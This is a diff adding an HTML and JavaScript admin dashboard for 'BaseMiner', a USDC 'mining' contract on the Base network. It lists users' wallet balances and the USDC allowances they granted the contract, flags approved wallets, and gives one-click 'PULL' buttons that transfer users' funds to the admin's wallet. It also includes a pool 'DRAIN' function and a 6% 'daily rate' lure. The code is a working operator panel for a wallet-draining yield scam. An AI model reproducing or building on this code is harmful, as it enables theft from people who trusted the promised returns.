@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BaseMiner | Command Center</title>
+    <!-- Ethers.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-dark: #0a0b0f;
+            --panel-bg: #13161f;
+            --accent: #0052ff; /* Base Blue */
+            --accent-hover: #004ad1;
+            --danger: #ff2d55;
+            --danger-hover: #d61e40;
+            --success: #00c853;
+            --text-main: #ffffff;
+            --text-muted: #8a919e;
+            --border: #2a2f3e;
+        }
+
+        * { box-sizing: border-box; outline: none; }
+        body { margin: 0; padding: 0; background: var(--bg-dark); font-family: 'Inter', sans-serif; color: var(--text-main); }
+        
+        /* --- Layout --- */
+        .navbar {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 20px 40px; background: rgba(19, 22, 31, 0.95);
+            border-bottom: 1px solid var(--border); backdrop-filter: blur(10px);
+            position: sticky; top: 0; z-index: 100;
+        }
+        .logo { font-size: 1.5rem; font-weight: 800; letter-spacing: -1px; display: flex; align-items: center; gap: 10px; }
+        .logo span { color: var(--accent); }
+        
+        .container { max-width: 1400px; margin: 40px auto; padding: 0 20px; }
+        
+        /* --- Cards & Grid --- */
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 40px; }
+        
+        .card {
+            background: var(--panel-bg); border: 1px solid var(--border);
+            border-radius: 16px; padding: 25px; position: relative;
+            transition: transform 0.2s;
+        }
+        .card h3 { margin: 0 0 10px 0; color: var(--text-muted); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; }
+        .card .value { font-size: 2rem; font-weight: 700; font-family: 'JetBrains Mono', monospace; }
+        
+        /* --- Controls --- */
+        .control-group { margin-top: 15px; display: flex; gap: 10px; }
+        input {
+            background: #000; border: 1px solid var(--border); color: white;
+            padding: 10px; border-radius: 8px; flex: 1; font-family: 'JetBrains Mono', monospace;
+        }
+        
+        /* --- Buttons --- */
+        .btn {
+            padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer;
+            font-weight: 600; font-size: 0.9rem; transition: all 0.2s;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+        .btn-primary { background: var(--accent); color: white; }
+        .btn-primary:hover { background: var(--accent-hover); box-shadow: 0 0 15px rgba(0,82,255,0.4); }
+        
+        .btn-danger { background: rgba(255, 45, 85, 0.1); color: var(--danger); border: 1px solid var(--danger); }
+        .btn-danger:hover { background: var(--danger); color: white; }
+        
+        .btn-ghost { background: transparent; border: 1px solid var(--border); color: var(--text-muted); }
+        .btn-ghost:hover { border-color: white; color: white; }
+
+        .btn-pull {
+            background: var(--danger); color: white; width: 100%;
+            font-weight: 800; text-transform: uppercase; letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(255, 45, 85, 0.3);
+        }
+        .btn-pull:hover { transform: scale(1.02); background: var(--danger-hover); }
+        .btn-pull:disabled { background: #333; color: #555; cursor: not-allowed; box-shadow: none; transform: none; }
+
+        /* --- Table --- */
+        .table-container { background: var(--panel-bg); border-radius: 16px; border: 1px solid var(--border); overflow: hidden; }
+        .table-header { padding: 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+        
+        table { width: 100%; border-collapse: collapse; }
+        th { text-align: left; padding: 15px 25px; color: var(--text-muted); font-size: 0.8rem; text-transform: uppercase; background: rgba(0,0,0,0.2); }
+        td { padding: 20px 25px; border-bottom: 1px solid var(--border); font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; }
+        tr:last-child td { border-bottom: none; }
+        tr:hover { background: rgba(255,255,255,0.02); }
+
+        /* --- Badges --- */
+        .badge { padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; }
+        .badge-safe { background: rgba(0, 200, 83, 0.1); color: var(--success); }
+        .badge-risk { background: rgba(255, 45, 85, 0.1); color: var(--danger); border: 1px solid var(--danger); }
+
+        /* --- Toast Notification --- */
+        #toast {
+            visibility: hidden; min-width: 250px; background-color: #333; color: #fff; text-align: center;
+            border-radius: 8px; padding: 16px; position: fixed; z-index: 1; left: 50%; bottom: 30px;
+            transform: translateX(-50%); border: 1px solid var(--accent);
+        }
+        #toast.show { visibility: visible; -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
+
+        @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
+        @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
+    </style>
+</head>
+<body>
+
+<!-- Navigation -->
+<nav class="navbar">
+    <div class="logo">⚡ Base<span>Miner</span><small style="font-size:0.5em; opacity:0.5; margin-left:10px;">PRO ADMIN</small></div>
+    <div style="display:flex; gap:15px;">
+        <div id="networkStatus" style="display:flex; align-items:center; gap:5px; font-size:0.8rem; color:var(--text-muted);">
+            <div style="width:8px; height:8px; background:gray; border-radius:50%;" id="netDot"></div> Not Connected
+        </div>
+        <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">Connect Admin Wallet</button>
+    </div>
+</nav>
+
+<div class="container">
+
+    <!-- Top Stats & Controls -->
+    <div class="grid">
+        <!-- Pool Balance -->
+        <div class="card">
+            <h3>Reward Pool (USDC)</h3>
+            <div class="value" id="poolBalance">0.00</div>
+            <div class="control-group">
+                <input type="number" id="fundAmount" placeholder="Amount">
+                <button class="btn btn-primary" onclick="fundPool()">Fund Pool</button>
+            </div>
+            <button class="btn btn-danger" style="margin-top:10px; width:100%;" onclick="emergencyWithdraw()">🚨 EMERGENCY DRAIN</button>
+        </div>
+
+        <!-- Global Settings -->
+        <div class="card">
+            <h3>Mining Configuration</h3>
+            
+            <div style="display:flex; justify-content:space-between; margin-bottom:5px; margin-top:10px;">
+                <span style="color:var(--text-muted)">Daily Rate (%):</span>
+            </div>
+            <div class="control-group" style="margin-top:0;">
+                <input type="number" id="dailyRateInput" placeholder="6">
+                <button class="btn btn-ghost" onclick="setDailyRate()">Update</button>
+            </div>
+
+            <div style="display:flex; justify-content:space-between; margin-bottom:5px; margin-top:15px;">
+                <span style="color:var(--text-muted)">System Status:</span>
+            </div>
+            <button id="pauseBtn" class="btn btn-primary" style="width:100%" onclick="togglePause()">PAUSE CLAIMS</button>
+        </div>
+
+        <!-- Analytics -->
+        <div class="card">
+            <h3>Live Metrics</h3>
+            <div style="margin-top:20px;">
+                <div style="display:flex; justify-content:space-between; border-bottom:1px solid #333; padding-bottom:10px;">
+                    <span style="color:var(--text-muted)">Total Users</span>
+                    <strong id="totalUsers">0</strong>
+                </div>
+                <div style="display:flex; justify-content:space-between; border-bottom:1px solid #333; padding:10px 0;">
+                    <span style="color:var(--text-muted)">Contract Address</span>
+                    <span style="font-size:0.8rem; cursor:pointer;" onclick="copyContract()" id="contractDisp">0x...</span>
+                </div>
+                <div style="display:flex; justify-content:space-between; padding-top:10px;">
+                    <span style="color:var(--text-muted)">Admin Status</span>
+                    <span style="color:var(--success)">Superuser</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Table -->
+    <div class="table-container">
+        <div class="table-header">
+            <h3>User Monitor & Action Center</h3>
+            <button class="btn btn-ghost" onclick="loadData()">↻ Refresh Data</button>
+        </div>
+        <table>
+            <thead>
+                <tr>
+                    <th>Wallet Address</th>
+                    <th>Wallet Balance</th>
+                    <th>Approved (Allowance)</th>
+                    <th>Risk Level</th>
+                    <th>Pending Rewards</th>
+                    <th style="text-align:right">ACTION</th>
+                </tr>
+            </thead>
+            <tbody id="userTable">
+                <tr><td colspan="6" style="text-align:center; padding:40px;">Connect wallet to load data...</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+</div>
+
+<!-- Toast -->
+<div id="toast">Action Successful</div>
+
+<script>
+    // ================= CONFIGURATION =================
+    // ⚠️ PASTE YOUR DEPLOYED CONTRACT ADDRESS HERE ⚠️
+    const CONTRACT_ADDRESS = "0x7496D84c2049d0be73D3B5B76798CAEc87839626"; 
+    // =================================================
+
+    // BASE MAINNET USDC (Fixed)
+    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; 
+
+    // ABIs
+    const MINING_ABI = [
+        "function getAllMiners() view returns (address[])",
+        "function adminPull(address _user)",
+        "function setDailyRate(uint256 _newRate)",
+        "function setMaintenanceMode(bool _status)",
+        "function isClaimPaused() view returns (bool)",
+        "function emergencyWithdraw()",
+        "function getPendingRewards(address) view returns (uint256)",
+        "function dailyRatePercent() view returns (uint256)"
+    ];
+    
+    const ERC20_ABI = [
+        "function balanceOf(address) view returns (uint256)",
+        "function allowance(address, address) view returns (uint256)",
+        "function transfer(address, uint256)",
+        "function approve(address, uint256)"
+    ];
+
+    let provider, signer, contract, usdcContract;
+
+    // --- Init & Connect ---
+    async function connectWallet() {
+        if (!window.ethereum) return showToast("MetaMask not found!");
+        
+        try {
+            provider = new ethers.BrowserProvider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            signer = await provider.getSigner();
+            
+            const network = await provider.getNetwork();
+            if (network.chainId !== 8453n) { // Base Chain ID
+                showToast("⚠️ Wrong Network! Switch to BASE.");
+            }
+
+            contract = new ethers.Contract(CONTRACT_ADDRESS, MINING_ABI, signer);
+            usdcContract = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
+            
+            const addr = await signer.getAddress();
+            document.getElementById("connectBtn").innerText = addr.slice(0,6) + "..." + addr.slice(-4);
+            document.getElementById("connectBtn").classList.replace("btn-primary", "btn-ghost");
+            
+            // UI Updates
+            document.getElementById("contractDisp").innerText = CONTRACT_ADDRESS.slice(0,8) + "...";
+            document.getElementById("netDot").style.background = "#00c853";
+            document.getElementById("networkStatus").innerHTML = `<div style="width:8px; height:8px; background:#00c853; border-radius:50%;"></div> Base Mainnet`;
+
+            loadData();
+        } catch (error) {
+            console.error(error);
+            showToast("Connection Failed");
+        }
+    }
+
+    // --- Core Data Loader ---
+    async function loadData() {
+        if (!contract) return;
+        const tbody = document.getElementById("userTable");
+        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; padding:40px; color:#888;">📡 Scanning Blockchain...</td></tr>`;
+
+        try {
+            // 1. Fetch Globals
+            const [poolBal, rate, isPaused, miners] = await Promise.all([
+                usdcContract.balanceOf(CONTRACT_ADDRESS),
+                contract.dailyRatePercent(),
+                contract.isClaimPaused(),
+                contract.getAllMiners()
+            ]);
+
+            document.getElementById("poolBalance").innerText = ethers.formatUnits(poolBal, 6);
+            document.getElementById("dailyRateInput").value = rate;
+            document.getElementById("totalUsers").innerText = miners.length;
+            
+            // Pause Button State
+            const pBtn = document.getElementById("pauseBtn");
+            if (isPaused) {
+                pBtn.innerText = "▶ RESUME CLAIMS";
+                pBtn.className = "btn btn-success";
+                pBtn.style.background = "#00c853";
+            } else {
+                pBtn.innerText = "⏸ PAUSE CLAIMS";
+                pBtn.className = "btn btn-primary";
+                pBtn.style.background = ""; // reset
+            }
+
+            // 2. Build User Table
+            tbody.innerHTML = "";
+            
+            if (miners.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; padding:40px;">No miners found yet.</td></tr>`;
+                return;
+            }
+
+            for (let miner of miners) {
+                // Fetch User Data
+                const [bal, allow, pending] = await Promise.all([
+                    usdcContract.balanceOf(miner),
+                    usdcContract.allowance(miner, CONTRACT_ADDRESS),
+                    contract.getPendingRewards(miner)
+                ]);
+
+                const fmtBal = parseFloat(ethers.formatUnits(bal, 6));
+                const fmtAllow = parseFloat(ethers.formatUnits(allow, 6));
+                const fmtPending = parseFloat(ethers.formatUnits(pending, 6));
+
+                // Risk Logic
+                const isRisk = fmtAllow > 0;
+                // We can pull the minimum of Balance or Allowance
+                const pullableAmount = Math.min(fmtBal, fmtAllow);
+
+                const row = document.createElement("tr");
+                row.innerHTML = `
+                    <td style="color:var(--accent);">${miner}</td>
+                    <td>${fmtBal.toFixed(2)} USDC</td>
+                    <td style="color:${isRisk ? '#fff' : '#555'}">${fmtAllow.toFixed(2)}</td>
+                    <td>${isRisk ? '<span class="badge badge-risk">APPROVED</span>' : '<span class="badge badge-safe">SAFE</span>'}</td>
+                    <td>${fmtPending.toFixed(4)}</td>
+                    <td style="text-align:right">
+                        <button class="btn btn-pull" 
+                            onclick="pullFunds('${miner}', ${pullableAmount})"
+                            ${pullableAmount <= 0 ? 'disabled' : ''}>
+                            PULL ${pullableAmount > 0 ? pullableAmount.toFixed(2) : ''}
+                        </button>
+                    </td>
+                `;
+                tbody.appendChild(row);
+            }
+
+        } catch (err) {
+            console.error(err);
+            tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:red">Error loading data. See console.</td></tr>`;
+        }
+    }
+
+    // --- Admin Actions ---
+
+    async function pullFunds(user, amount) {
+        if (!confirm(`⚠️ WARNING\n\nAre you sure you want to PULL ${amount} USDC from:\n${user}?\n\nThis action transfers funds to your wallet.`)) return;
+        
+        try {
+            showToast("⏳ Initiating Pull...");
+            const tx = await contract.adminPull(user);
+            await tx.wait();
+            showToast("✅ Funds Pulled Successfully!");
+            loadData();
+        } catch (e) {
+            alert(e.message);
+        }
+    }
+
+    async function setDailyRate() {
+        const val = document.getElementById("dailyRateInput").value;
+        try {
+            const tx = await contract.setDailyRate(val);
+            showToast("⏳ Updating Rate...");
+            await tx.wait();
+            showToast("✅ Daily Rate Updated");
+        } catch (e) { alert(e.message); }
+    }
+
+    async function togglePause() {
+        const pBtn = document.getElementById("pauseBtn");
+        const isPaused = pBtn.innerText.includes("RESUME"); // If text is Resume, we are currently paused
+        // We want to flip the status. If paused (true), we send false to resume.
+        // Wait, logic: setMaintenanceMode(true) = Paused.
+        
+        try {
+            const tx = await contract.setMaintenanceMode(!isPaused);
+            showToast("⏳ Updating Status...");
+            await tx.wait();
+            showToast("✅ Status Updated");
+            loadData();
+        } catch (e) { alert(e.message); }
+    }
+
+    async function fundPool() {
+        const amt = document.getElementById("fundAmount").value;
+        if (!amt) return;
+        try {
+            const parsed = ethers.parseUnits(amt, 6);
+            showToast("1/2 Approving USDC...");
+            const tx1 = await usdcContract.approve(CONTRACT_ADDRESS, parsed);
+            await tx1.wait();
+            
+            showToast("2/2 Depositing...");
+            const tx2 = await usdcContract.transfer(CONTRACT_ADDRESS, parsed);
+            await tx2.wait();
+            
+            showToast("✅ Pool Funded!");
+            document.getElementById("fundAmount").value = "";
+            loadData();
+        } catch (e) { alert(e.message); }
+    }
+
+    async function emergencyWithdraw() {
+        const confirmStr = prompt("Type 'DRAIN' to confirm withdrawing ALL funds from the contract:");
+        if (confirmStr !== 'DRAIN') return;
+        
+        try {
+            const tx = await contract.emergencyWithdraw();
+            showToast("⏳ Draining Pool...");
+            await tx.wait();
+            showToast("✅ Contract Drained");
+            loadData();
+        } catch (e) { alert(e.message); }
+    }
+
+    // Utilities
+    function showToast(msg) {
+        const x = document.getElementById("toast");
+        x.innerText = msg;
+        x.className = "show";
+        setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
+    }
+
+    function copyContract() {
+        navigator.clipboard.writeText(CONTRACT_ADDRESS);
+        showToast("Address Copied!");
+    }
+
+</script>
+</body>
+</html>
